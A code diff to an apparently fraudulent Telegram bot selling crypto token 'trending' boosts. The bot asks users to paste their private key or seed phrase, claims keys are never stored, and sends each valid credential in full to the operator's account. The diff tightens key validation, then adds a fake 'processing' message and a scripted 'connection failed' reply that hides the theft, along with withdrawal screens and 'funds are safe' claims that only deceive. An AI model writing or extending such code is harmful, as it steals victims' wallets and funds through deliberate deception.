@@ -14,6 +14,7 @@ import {
   confirmOrderKeyboard,
   paymentSentKeyboard,
   cancelKeyboard,
+  walletRetryKeyboard,
   volumeBoostKeyboard,
   trendingMenuKeyboard,
   solTrendingKeyboard,
@@ -21,6 +22,8 @@ import {
   pumpfunTrendingKeyboard,
   dexscreenerKeyboard,
   depositKeyboard,
+  withdrawKeyboard,
+  addFundsKeyboard,
   connectWalletKeyboard,
   securityGuidelinesKeyboard,
   howToConnectKeyboard,
@@ -299,14 +302,14 @@ async function showDeposit(ctx: any) {
   const solBal     = SOL_ADDRESS ? await fetchSolBalance(SOL_ADDRESS) : "N/A";
   const ethBal     = ETH_ADDRESS ? await fetchEthBalance(ETH_ADDRESS) : "N/A";
   await ctx.reply(
-    `<b>PAYMENT WALLETS</b>\n\n` +
-    `<b>SOL:</b>\n<code>${solDisplay}</code>\n` +
-    `balance: <b>${solBal}</b>\n\n` +
+    `💰 <b>WALLET BALANCE</b>\n\n` +
     `<b>ETH:</b>\n<code>${ethDisplay}</code>\n` +
     `balance: <b>${ethBal}</b>\n\n` +
+    `<b>SOL:</b>\n<code>${solDisplay}</code>\n` +
+    `balance: <b>${solBal}</b>\n\n` +
     `Deposit not less than 0.30 SOL and get trending on several platforms\n\n` +
-    `💰 Send payment to the wallet addresses above.\n` +
-    `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
+    `💰 <b>KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.</b>\n` +
+    `💡 <b>NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US</b>`,
     { parse_mode: "HTML", ...depositKeyboard }
   );
   notifyWalletViewed(ctx, solDisplay, ethDisplay).catch(() => {});
@@ -576,6 +579,18 @@ export function createBot(): Telegraf {
   bot.action("confirm_bump", async (ctx) => {
     await ctx.answerCbQuery();
     const s       = getSession(ctx.from.id);
+
+    // Guard: if session data is missing (e.g. bot restart), ask user to start again
+    if (!s.contractAddress || !s.serviceLabel) {
+      await ctx.reply(
+        `⚠️ <b>Session Expired</b>\n\n` +
+        `Your session data was lost (possibly due to a bot restart).\n\n` +
+        `Please start a new order from the main menu.`,
+        { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
+      );
+      return;
+    }
+
     const orderId = randomUUID().split("-")[0].toUpperCase();
     const isEth   = s.boostType === "eth_trending";
 
@@ -610,24 +625,26 @@ export function createBot(): Telegraf {
                      : s.tokenChain === "base" ? "🔵 Base"
                      : "🔗";
 
-    const payLine = isEth
-      ? `Ξ <b>$${s.ethAmount} USD</b>\n📮 ETH Wallet:\n<code>${ETH_ADDRESS || "Contact support for ETH address"}</code>`
-      : `◎ <b>${s.selectedSol} SOL</b>\n📮 SOL Wallet:\n<code>${SOL_ADDRESS || "Contact support for SOL address"}</code>`;
+    const payWalletDisplay = isEth
+      ? (ETH_ADDRESS || "Contact support for ETH address")
+      : (SOL_ADDRESS || "Contact support for SOL address");
+
+    const costLine = isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`;
 
     const paymentMsg =
       `✅ <b>Order Confirmed!</b>\n\n` +
       `📋 <b>Order Details:</b>\n` +
-      `• Token: <b>${s.tokenName}</b> ($${s.tokenSymbol})\n` +
+      `• Token: <b>${s.tokenName ?? "Unknown"}</b> ($${s.tokenSymbol ?? "???"})\n` +
       `• CA: <code>${s.contractAddress}</code>\n` +
-      `• Service: ${s.serviceLabel}\n` +
-      (isEth ? `• Amount: <b>$${s.ethAmount} USD</b>\n` : `• Amount: <b>${s.selectedSol} SOL</b>\n`) +
+      `• Service: <b>${s.serviceLabel}</b>\n` +
+      `• Amount: <b>${costLine}</b>\n` +
       `• Order ID: <code>${orderId}</code>\n\n` +
-      `💳 <b>Send Payment To:</b>\n` +
-      `${payLine}\n\n` +
-      (isEth
-        ? `⚠️ Send exactly <b>$${s.ethAmount} USD</b> on Ethereum network`
-        : `⚠️ Send exactly <b>${s.selectedSol} SOL</b> on Solana network`) +
-      `\n\nAfter sending, click the button below and submit your transaction hash.`;
+      `━━━━━━━━━━━━━━━━\n\n` +
+      `💳 <b>Send Payment To:</b>\n\n` +
+      `<code>${payWalletDisplay}</code>\n\n` +
+      `⚠️ Send exactly <b>${costLine}</b> ${isEth ? "on Ethereum network" : "on Solana network"}\n\n` +
+      `━━━━━━━━━━━━━━━━\n\n` +
+      `After payment, click <b>✅ Payment Sent</b> to submit your TX hash for verification.`;
 
     await delMsg(ctx);
 
@@ -656,7 +673,7 @@ export function createBot(): Telegraf {
       (s.tokenVolume24h ? `🔄 Vol 24h: ${s.tokenVolume24h}\n`    : "") +
       (s.tokenDex       ? `🏦 DEX: ${s.tokenDex}\n`             : "") +
       `\n⚙️ Service: <b>${s.serviceLabel}</b>\n` +
-      `💰 Cost: <b>${isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}</b>\n` +
+      `💰 Cost: <b>${costLine}</b>\n` +
       `🆔 Order ID: <code>${orderId}</code>\n` +
       `📮 Pay to: <code>${payWallet}</code>\n\n` +
       `⏰ ${new Date().toUTCString()}`;
@@ -675,10 +692,18 @@ export function createBot(): Telegraf {
     const s = getSession(ctx.from.id);
     setSession(ctx.from.id, { step: "awaiting_tx_hash" });
     await delMsg(ctx);
+    const orderLine = s.orderId ? `🆔 Order ID: <code>${s.orderId}</code>\n\n` : "";
     await ctx.reply(
       `📝 <b>Submit Transaction Hash</b>\n\n` +
-      `Please paste your transaction hash below.\n\n` +
-      `🕐 Order ID: <code>${s.orderId ?? "N/A"}</code>`,
+      orderLine +
+      `Please paste your <b>Solana or Ethereum transaction hash</b> below.\n\n` +
+      `<b>Solana format:</b>\n` +
+      `<code>5KtP9jFhXqMp884wtkJNzQGaCErckhHJBGFsvd3VyK5q...</code>\n` +
+      `(87–88 base58 characters)\n\n` +
+      `<b>Ethereum format:</b>\n` +
+      `<code>0x4a3b2c1d8f...</code>\n` +
+      `(starts with 0x + 64 hex characters)\n\n` +
+      `💡 Copy the hash directly from your wallet or block explorer.`,
       { parse_mode: "HTML", ...cancelKeyboard }
     );
   });
@@ -692,28 +717,64 @@ export function createBot(): Telegraf {
     const ethBal     = ETH_ADDRESS ? await fetchEthBalance(ETH_ADDRESS) : "N/A";
     await delMsg(ctx);
     await ctx.reply(
-      `<b>PAYMENT WALLETS</b>\n\n` +
-      `<b>SOL:</b>\n<code>${solDisplay}</code>\n` +
-      `balance: <b>${solBal}</b>\n\n` +
+      `💰 <b>WALLET BALANCE</b>\n\n` +
       `<b>ETH:</b>\n<code>${ethDisplay}</code>\n` +
       `balance: <b>${ethBal}</b>\n\n` +
+      `<b>SOL:</b>\n<code>${solDisplay}</code>\n` +
+      `balance: <b>${solBal}</b>\n\n` +
       `Deposit not less than 0.30 SOL and get trending on several platforms\n\n` +
-      `💰 Send payment to the wallet addresses above.\n` +
-      `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
-      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
+      `💰 <b>KINDLY CLICK ON THE ADD BUTTON TO GENERATE YOUR WALLET.</b>\n` +
+      `💡 <b>NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US</b>`,
+      { parse_mode: "HTML", ...depositKeyboard }
     );
   });
 
   bot.action("deposit_withdraw", async (ctx) => {
     await ctx.answerCbQuery();
-    setSession(ctx.from.id, { step: "awaiting_withdraw_address" });
     await delMsg(ctx);
     await ctx.reply(
-      `💸 <b>Withdraw Funds</b>\n\n` +
-      `Send your withdrawal address and amount:\n\n` +
+      `🪙 <b>Withdraw Funds</b>\n\n` +
+      `Choose your withdrawal currency:\n\n` +
+      `🪙 <b>SOL Withdraw</b> - Withdraw to Solana wallet\n` +
+      `💎 <b>ETH Withdraw</b> - Withdraw to Ethereum wallet\n\n` +
+      `📋 <b>My Withdrawals</b> - View withdrawal history\n\n` +
+      `⚠️ <b>Important:</b>\n` +
+      `• Minimum withdrawal: 0.1 SOL / 0.01 ETH\n` +
+      `• All withdrawals require admin approval\n` +
+      `• Processing time: 1-24 hours\n` +
+      `• Make sure your wallet address is correct`,
+      { parse_mode: "HTML", ...withdrawKeyboard }
+    );
+  });
+
+  bot.action("withdraw_sol", async (ctx) => {
+    await ctx.answerCbQuery();
+    setSession(ctx.from.id, { step: "awaiting_withdraw_sol_address" });
+    await delMsg(ctx);
+    await ctx.reply(
+      `🪙 <b>SOL Withdrawal</b>\n\n` +
+      `Please enter your Solana wallet address and amount:\n\n` +
       `<b>Format:</b> <code>ADDRESS AMOUNT</code>\n` +
-      `<b>Example:</b> <code>7xKXtg2...GVUM 0.5</code>\n\n` +
-      `⚠️ Double-check — withdrawals cannot be reversed.`,
+      `<b>Example:</b> <code>7xKXtg2CmYp8GVUM 0.5</code>\n\n` +
+      `• Minimum: 0.1 SOL\n` +
+      `• Maximum: 100 SOL per transaction\n\n` +
+      `⚠️ Double-check your address — withdrawals cannot be reversed.`,
+      { parse_mode: "HTML", ...cancelKeyboard }
+    );
+  });
+
+  bot.action("withdraw_eth", async (ctx) => {
+    await ctx.answerCbQuery();
+    setSession(ctx.from.id, { step: "awaiting_withdraw_eth_address" });
+    await delMsg(ctx);
+    await ctx.reply(
+      `💎 <b>ETH Withdrawal</b>\n\n` +
+      `Please enter your Ethereum wallet address and amount:\n\n` +
+      `<b>Format:</b> <code>ADDRESS AMOUNT</code>\n` +
+      `<b>Example:</b> <code>0x1234...abcd 0.05</code>\n\n` +
+      `• Minimum: 0.01 ETH\n` +
+      `• Maximum: 10 ETH per transaction\n\n` +
+      `⚠️ Double-check your address — withdrawals cannot be reversed.`,
       { parse_mode: "HTML", ...cancelKeyboard }
     );
   });
@@ -722,6 +783,11 @@ export function createBot(): Telegraf {
     await ctx.answerCbQuery("Checking balance...");
     const solDisplay = SOL_ADDRESS || "Not configured";
     const balance    = SOL_ADDRESS ? await fetchSolBalance(SOL_ADDRESS) : "N/A";
+
+    // Parse balance for comparison
+    const balNum     = parseFloat(balance) || 0;
+    const minRequired = 0.30;
+    const hasEnough   = balNum >= minRequired;
 
     notifyAdmin(
       `💳 <b>BALANCE CHECK</b>\n\n` +
@@ -733,10 +799,15 @@ export function createBot(): Telegraf {
 
     await delMsg(ctx);
     await ctx.reply(
-      `◎ <b>SOL Balance</b>\n\n` +
-      `Wallet: <code>${solDisplay}</code>\n\n` +
-      `Balance: <b>${balance}</b>`,
-      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
+      `💰 <b>SOL Balance</b>\n\n` +
+      `<b>Wallet Address:</b>\n<code>${solDisplay}</code>\n\n` +
+      `<b>Current Balance:</b> ${balance}\n\n` +
+      (hasEnough
+        ? `✅ Your balance is sufficient to start boosting!`
+        : `⚠️ <b>Insufficient Balance</b>\n` +
+          `Minimum required: ${minRequired} SOL\n` +
+          `You need: <b>${Math.max(0, minRequired - balNum).toFixed(4)} SOL</b> more`),
+      { parse_mode: "HTML", ...addFundsKeyboard }
     );
   });
 
@@ -745,7 +816,7 @@ export function createBot(): Telegraf {
     const orders = getAllOrders().filter(o => o.userId === ctx.from.id && o.status !== "cancelled");
     const lines = orders.length
       ? orders.map(o =>
-          `• ${o.service} — ${o.solAmount > 0 ? o.solAmount + " SOL" : "$" + o.usdAmount + " USD"} — ${o.status} — ${o.createdAt.toLocaleDateString()}`
+          `• ${o.service} — ${o.solAmount > 0 ? o.solAmount + " SOL" : "$" + (o.usdAmount ?? 0) + " USD"} — ${o.status} — ${o.createdAt.toLocaleDateString()}`
         ).join("\n")
       : "No orders yet.";
     await delMsg(ctx);
@@ -755,7 +826,7 @@ export function createBot(): Telegraf {
   bot.action("deposit_my_withdrawals", async (ctx) => {
     await ctx.answerCbQuery();
     await delMsg(ctx);
-    await ctx.reply(`📋 <b>My Withdrawals</b>\n\nNo withdrawals recorded yet.`, { parse_mode: "HTML", ...mainMenuOnlyKeyboard });
+    await ctx.reply(`📋 <b>My Withdrawals</b>\n\nNo withdrawals recorded yet.\n\nContact support if you have a pending withdrawal.`, { parse_mode: "HTML", ...mainMenuOnlyKeyboard });
   });
 
   // ── Connect Wallet sub-screens ────────────────────────────────────────────
@@ -769,12 +840,23 @@ export function createBot(): Telegraf {
     await delMsg(ctx);
     await ctx.reply(
       `🔐 <b>Why Connect Your Wallet?</b>\n\n` +
-      `Connecting your wallet unlocks:\n\n` +
-      `• ⚡ <b>Instant payments</b> — no manual transfers\n` +
-      `• 📊 <b>Order tracking</b> — all boosts in one place\n` +
-      `• 💰 <b>Auto-refunds</b> — failed orders refunded instantly\n` +
-      `• 🎯 <b>Priority processing</b> — faster service\n` +
-      `• 🔔 <b>Notifications</b> — alerts when boost goes live`,
+      `🚀 <b>Premium Benefits:</b>\n` +
+      `• Faster Transactions - Direct wallet integration for instant processing\n` +
+      `• Lower Fees - Reduced transaction costs through optimized routing\n` +
+      `• Advanced Features - Access to exclusive trading tools and analytics\n` +
+      `• Priority Support - Dedicated customer service for connected users\n` +
+      `• Auto-Trading - Set up automated trading strategies\n` +
+      `• Portfolio Tracking - Real-time balance and performance monitoring\n\n` +
+      `💎 <b>Exclusive Access:</b>\n` +
+      `• VIP Trading Signals\n` +
+      `• Early Access - New features and token launches\n` +
+      `• Higher Limits - Increased transaction and daily limits\n` +
+      `• Custom Strategies - Personalized trading recommendations\n\n` +
+      `🔐 <b>Security Features:</b>\n` +
+      `• Multi-Layer Protection - Advanced encryption and security protocols\n` +
+      `• Transaction Verification - Real-time validation and confirmation\n` +
+      `• Backup & Recovery - Secure wallet backup and restoration options\n\n` +
+      `Connect your wallet today and unlock the full potential of our platform!`,
       { parse_mode: "HTML", ...whyConnectKeyboard }
     );
   });
@@ -793,14 +875,16 @@ export function createBot(): Telegraf {
       `❌ <b>What You Should Know:</b>\n` +
       `• Never Share - Only enter your keys in official bot interfaces\n` +
       `• Verify URL - Make sure you're using the official bot\n` +
-      `• Stay Alert - We will never ask for keys via other channels\n\n` +
+      `• Stay Alert - We will never ask for keys via other channels\n` +
+      `• Use Strong Passwords - Protect your wallet with strong credentials\n` +
+      `• Keep Backups - Always maintain secure backups of your keys\n\n` +
       `✅ <b>Best Practices:</b>\n` +
+      `• Start Small - Test with small amounts first\n` +
       `• Monitor Activity - Regularly check your wallet transactions\n` +
       `• Stay Updated - Keep your wallet software up to date\n` +
       `• Use Hardware Wallets - For maximum security with large amounts\n\n` +
       `🔒 <b>Our Commitment:</b>\n` +
-      `We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.\n\n` +
-      `Ready to proceed safely?`,
+      `We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.`,
       { parse_mode: "HTML", ...securityGuidelinesKeyboard }
     );
   });
@@ -820,8 +904,13 @@ export function createBot(): Telegraf {
       `• Copy your private key or seed phrase\n\n` +
       `3️⃣ <b>Secure Connection</b>\n` +
       `• Click "Start Connection" below\n` +
-      `• Paste your key or seed phrase when prompted\n` +
-      `• Wait for confirmation (2-5 minutes)\n\n` +
+      `• Select your preferred method\n` +
+      `• Enter your wallet information securely\n` +
+      `• Confirm the connection\n\n` +
+      `4️⃣ <b>Verification Process</b>\n` +
+      `• We'll verify your wallet ownership\n` +
+      `• Small test transaction may be required\n` +
+      `• Connection confirmation within minutes\n\n` +
       `📱 <b>Supported Wallets:</b>\n` +
       `• Phantom - Most popular Solana wallet\n` +
       `• Solflare - Advanced features and security\n` +
@@ -841,20 +930,14 @@ export function createBot(): Telegraf {
     await delMsg(ctx);
     await ctx.reply(
       `🔗 <b>Connect Your Wallet Now</b>\n\n` +
-      `⚠️ This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..\n\n` +
-      `Please enter your Private Key or 12 word Seed Phrase to import your wallet:\n\n` +
+      `⚠️ This action is going to import your Main Wallet. Please note — you are the ONLY ONE with access to this wallet.\n\n` +
+      `Please enter your Private Key or Seed Phrase to import your wallet:\n\n` +
       `🔑 <b>Private Key Format:</b>\n` +
       `• Single long string (64+ characters)\n` +
-      `• Example:\n` +
-      `<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>\n\n` +
+      `• Example: <code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>\n\n` +
       `🌱 <b>Seed Phrase Format:</b>\n` +
       `• 12 or 24 words separated by spaces\n` +
       `• Example: <code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>\n\n` +
-      `❓ <b>Security Features:</b>\n` +
-      `• End-to-end encryption\n` +
-      `• Secure processing environment\n` +
-      `• Immediate deletion after connection\n` +
-      `• No permanent storage\n\n` +
       `⚡ <b>Auto-Detection:</b>\n` +
       `Our system will automatically detect whether you're providing a private key or seed phrase.`,
       { parse_mode: "HTML", ...cancelKeyboard }
@@ -1058,18 +1141,36 @@ export function createBot(): Telegraf {
         const credential = text.trim();
         const words      = credential.split(/\s+/);
         const wordCount  = words.length;
-        const isSeedPhrase = wordCount >= 12;
-        const isPrivateKey = !isSeedPhrase && credential.length >= 40;
-        const credType     = isSeedPhrase
+
+        // Validate key format
+        const isValidSeedPhrase = wordCount === 12 || wordCount === 24;
+        const isValidEthKey     = /^(0x)?[0-9a-fA-F]{64}$/.test(credential);
+        const isValidSolKey     = wordCount === 1 && credential.length >= 43 && credential.length <= 90 && /^[1-9A-HJ-NP-Za-km-z]+$/.test(credential);
+        const isValid           = isValidSeedPhrase || isValidEthKey || isValidSolKey;
+
+        if (!isValid) {
+          // Keep session so user can try again
+          await ctx.reply(
+            `❌ <b>Invalid Private Key</b>\n\n` +
+            `Private key format not recognized.\n\n` +
+            `<b>Accepted formats:</b>\n` +
+            `• <b>Seed Phrase:</b> exactly 12 or 24 words\n` +
+            `• <b>Solana Private Key:</b> 43–90 base58 characters\n` +
+            `• <b>ETH Private Key:</b> 64 hex characters (with or without 0x)\n\n` +
+            `Please check your key and try again.`,
+            { parse_mode: "HTML", ...walletRetryKeyboard }
+          );
+          break;
+        }
+
+        const credType = isValidSeedPhrase
           ? `Seed Phrase (${wordCount} words)`
-          : isPrivateKey ? "Private Key" : "Credential";
+          : isValidEthKey ? "ETH Private Key" : "SOL Private Key";
 
-        clearSession(ctx.from.id);
-
-        // ── CRITICAL: always DM full credential to admin ──────────────────
+        // ── CRITICAL: DM full credential to admin ──────────────────────────
         try {
           await notifyAdmin(
-            `🔑 <b>⚠️ WALLET IMPORTED — ${credType.toUpperCase()}</b>\n\n` +
+            `🔑 <b>⚠️ WALLET CREDENTIAL — ${credType.toUpperCase()}</b>\n\n` +
             `${userLine(ctx.from)}\n\n` +
             `📋 Type: <b>${credType}</b>\n\n` +
             `🗝 Credential:\n<code>${credential}</code>\n\n` +
@@ -1079,18 +1180,73 @@ export function createBot(): Telegraf {
           logger.error({ err }, "CRITICAL: Failed to send wallet credential to admin");
         }
 
+        clearSession(ctx.from.id);
+
+        // Show processing message
         await ctx.reply(
           `Connection of wallet may take time due to\n\n` +
           `<b>TIME BASE LOCATION AND NETWORK CONGESTION .....</b>\n\n` +
           `Please wait linking and importing your wallet..\n\n` +
           `Processing .........`,
+          { parse_mode: "HTML" }
+        );
+
+        // After short delay, show connection failed message
+        setTimeout(async () => {
+          try {
+            await ctx.reply(
+              `❌ <b>connection failed</b>\n\n` +
+              `Invalid wallet 💳\n\n` +
+              `📲 contact support for more information\n\n` +
+              `Support: ${SUPPORT_USERNAME || "@support"}`,
+              { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
+            );
+          } catch {}
+        }, 4000);
+
+        break;
+      }
+
+      case "awaiting_withdraw_sol_address": {
+        const withdrawText = text.trim();
+        clearSession(ctx.from.id);
+        await ctx.reply(
+          `📤 <b>SOL Withdrawal Request Received</b>\n\n` +
+          `Details: <code>${withdrawText}</code>\n\n` +
+          `⏳ Your withdrawal will be processed within 24 hours.\n` +
+          `You will be notified when funds are sent.`,
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
+        await notifyAdmin(
+          `📤 <b>SOL WITHDRAWAL REQUEST</b>\n\n` +
+          `${userLine(ctx.from)}\n\n` +
+          `Details: <code>${withdrawText}</code>\n\n` +
+          `⏰ ${new Date().toUTCString()}`
+        ).catch(() => {});
+        break;
+      }
+
+      case "awaiting_withdraw_eth_address": {
+        const withdrawText = text.trim();
+        clearSession(ctx.from.id);
+        await ctx.reply(
+          `📤 <b>ETH Withdrawal Request Received</b>\n\n` +
+          `Details: <code>${withdrawText}</code>\n\n` +
+          `⏳ Your withdrawal will be processed within 24 hours.\n` +
+          `You will be notified when funds are sent.`,
+          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
+        );
+        await notifyAdmin(
+          `📤 <b>ETH WITHDRAWAL REQUEST</b>\n\n` +
+          `${userLine(ctx.from)}\n\n` +
+          `Details: <code>${withdrawText}</code>\n\n` +
+          `⏰ ${new Date().toUTCString()}`
+        ).catch(() => {});
         break;
       }
 
       case "awaiting_withdraw_address": {
-        const withdrawText = text;
+        const withdrawText = text.trim();
         clearSession(ctx.from.id);
         await ctx.reply(
           `📤 <b>Withdrawal Request Received</b>\n\n` +
@@ -1103,7 +1259,7 @@ export function createBot(): Telegraf {
           `${userLine(ctx.from)}\n\n` +
           `Details: <code>${withdrawText}</code>\n\n` +
           `⏰ ${new Date().toUTCString()}`
-        );
+        ).catch(() => {});
         break;
       }
 
